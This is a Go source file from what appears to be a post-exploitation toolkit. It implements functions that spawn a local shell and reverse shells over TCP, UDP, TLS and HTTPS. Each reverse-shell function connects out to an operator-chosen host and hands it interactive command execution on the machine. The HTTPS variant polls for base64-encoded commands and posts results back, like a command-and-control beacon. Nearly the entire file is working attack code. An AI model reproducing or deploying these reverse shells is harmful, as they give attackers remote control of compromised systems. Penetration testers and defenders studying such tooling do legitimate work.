package postex
//Contains functions for spawning various different types of shell, local and remote.

import "fmt"
import "os"
import "strings"
import "net"
import "crypto/tls"
import "strconv"
import "encoding/base64"
import "time"

/*
* LocalShell(filepath string)
* Spawns a basic local shell connected to STDIN and STDOUT.
*/

func LocalShell(filepath string) {
	//spawn the shell
	var session *shell
	var err error
	session,err = spawnShell(filepath)
	if err != nil {
		fmt.Println("Error initialising.")
		fmt.Println(string(err.Error()))
		return
	}
	session.launch()
	defer session.stop()
	//output goroutine
	go func(session *shell) {
		for {
			fmt.Printf(session.recv())
		}
	}(session)
	//input loop
	running := true
	for running == true {
		//get input
		msg := make([]byte, 500)
		r,_ := os.Stdin.Read(msg)
		if strings.HasPrefix(string(msg), "exit") {
			running = false
		}
		//now send the command
		string_msg := fmt.Sprintf("%s", msg[0:r])
		string_msg = strings.TrimRight(string_msg, "\r\n")
		string_msg += "\n"
		session.send(string_msg)
	}
}

/*
* ReverseTCPShell(filepath string, host string, port int)
*
* Builds on the functionality in LocalShell() to send out an interactive shell via the net package.
*/

func ReverseTCPShell(filepath string, host string, port int) {
	//set up the socket
	addr_string := host + ":" + strconv.Itoa(port)
	target_addr,err := net.ResolveTCPAddr("tcp4", addr_string)
	if err != nil {
		fmt.Println("Error resolving TCP address.")
		fmt.Println(string(err.Error()))
		return
	}
	target_conn,err := net.DialTCP("tcp4", nil, target_addr)
	if err != nil {
		fmt.Println("Error connecting to", addr_string)
		fmt.Println(string(err.Error()))
		return
	}
	defer target_conn.Close()
	//spawn the shell
	session,err := spawnShell(filepath)
	if err != nil {
		fmt.Println("Error initialising.")
		fmt.Println(string(err.Error()))
		return
	}
	session.launch()
	defer session.stop()
	//output goroutine
	go func(session *shell) {
		for {
			target_conn.Write([]byte(session.recv()))
		}
	}(session)
	//input loop
	running := true
	for running == true {
		//get input
		msg := make([]byte, 500)
		r,_ := target_conn.Read(msg)
		if strings.HasPrefix(string(msg), "exit") {
			running = false
		}
		//now send the command
		string_msg := fmt.Sprintf("%s", msg[0:r])
		string_msg = strings.TrimRight(string_msg, "\r\n")
		string_msg += "\n"
		session.send(string_msg)
	}
}

/*
* ReverseUDPShell(filepath string, host string, port int)
*
* Builds on the functionality in LocalShell() to send out an interactive shell via the net package.
*/

func ReverseUDPShell(filepath string, host string, port int) {
	//set up the socket
	addr_string := host + ":" + strconv.Itoa(port)
	target_addr,err := net.ResolveUDPAddr("udp4", addr_string)
	if err != nil {
		fmt.Println("Error resolving UDP address.")
		fmt.Println(string(err.Error()))
		return
	}
	target_conn,err := net.DialUDP("udp4", nil, target_addr)
	if err != nil {
		fmt.Println("Error connecting to", addr_string)
		fmt.Println(string(err.Error()))
		return
	}
	target_conn.Write([]byte("\n")) //you must send some initial data in order to establish the reverse connection over UDP
	defer target_conn.Close()
	//spawn the shell
	session,err := spawnShell(filepath)
	if err != nil {
		fmt.Println("Error initialising.")
		fmt.Println(string(err.Error()))
		return
	}
	session.launch()
	defer session.stop()
	//output goroutine
	go func(session *shell) {
		for {
			target_conn.Write([]byte(session.recv()))
		}
	}(session)
	//input loop
	running := true
	for running == true {
		//get input
		msg := make([]byte, 500)
		r,_ := target_conn.Read(msg)
		if strings.HasPrefix(string(msg), "exit") {
			running = false
		}
		//now send the command
		string_msg := fmt.Sprintf("%s", msg[0:r])
		string_msg = strings.TrimRight(string_msg, "\r\n")
		string_msg += "\n"
		session.send(string_msg)
	}
}

/*
* ReverseTCPShellTLS(filepath string, host string, port int)
*
* Builds on the functionality in LocalShell() to send out an interactive shell via the tls package; this one is encrypted.
*/

func ReverseTCPShellTLS(filepath string, host string, port int, skip_verify bool) {
	//set up the socket
	addr_string := host + ":" + strconv.Itoa(port)
	conf := &tls.Config{InsecureSkipVerify: skip_verify}
	target_conn,err := tls.Dial("tcp4", addr_string, conf)
	if err != nil {
		fmt.Println("Error connecting to", addr_string)
		fmt.Println(string(err.Error()))
		return
	}
	defer target_conn.Close()
	//spawn the shell
	session,err := spawnShell(filepath)
	if err != nil {
		fmt.Println("Error initialising.")
		fmt.Println(string(err.Error()))
		return
	}
	session.launch()
	defer session.stop()
	//output goroutine
	go func(session *shell) {
		for {
			target_conn.Write([]byte(session.recv()))
		}
	}(session)
	//input
	running := true
	for running == true {
		//get input
		msg := make([]byte, 500)
		r,_ := target_conn.Read(msg)
		if strings.HasPrefix(string(msg), "exit") {
			running = false
		}
		//now send the command
		string_msg := fmt.Sprintf("%s", msg[0:r])
		string_msg = strings.TrimRight(string_msg, "\r\n")
		string_msg += "\n"
		session.send(string_msg)
	}
}

/*
* ReverseShellHTTPS(filepath string, host string, port int, inputUri string, outputUri string, skip_verify bool)
*
* Builds on the functionality in LocalShell() to send out an interactive shell by making HTTPS requests.
* INPUT is retrieved by periodically making a GET request to inputUri and reading the base64-encoded response.
* OUTPUT is returned by making a POST request to outputUri with base64-encoded results.
*/

func ReverseShellHTTPS(filepath string, host string, port int, inputUri string, outputUri string, skip_verify bool) {
	//spawn the shell
	session, err := spawnShell(filepath)
	if err != nil {
		fmt.Println("Error initialising.")
		fmt.Println(string(err.Error()))
		return
	}
	session.launch()
	defer session.stop()
	//prepare the URLs
	client := getClient(skip_verify)
	baseUrl := "https://" + host + ":" + strconv.Itoa(port)
	inputUrl := baseUrl + inputUri
	outputUrl := baseUrl + outputUri
	//output goroutine
	go func(session *shell) {
		for {
			output := []byte(session.recv())
			output_encoded := []byte(base64.StdEncoding.EncodeToString(output))
			err := doPost(outputUrl, output_encoded, client)
			if err != nil {
				fmt.Println(string(err.Error()))
			}
		}
	}(session)
	//input
	running := true
	for running == true {
		time.Sleep(time.Second * 5)
		//get input
		msg,err := doGet(inputUrl, client)
		if err != nil {
			fmt.Println(string(err.Error()))
		} else {
			decoded_msg,err := base64.StdEncoding.DecodeString(msg)
			if err != nil {
				fmt.Println(string(err.Error()))
			} else {
				string_msg := string(decoded_msg)
				if strings.HasPrefix(string_msg, "exit") {
					running = false
				}
				string_msg = strings.TrimRight(string_msg, "\r\n")
				string_msg += "\n"
				session.send(string_msg)
			}
		}
	}
}

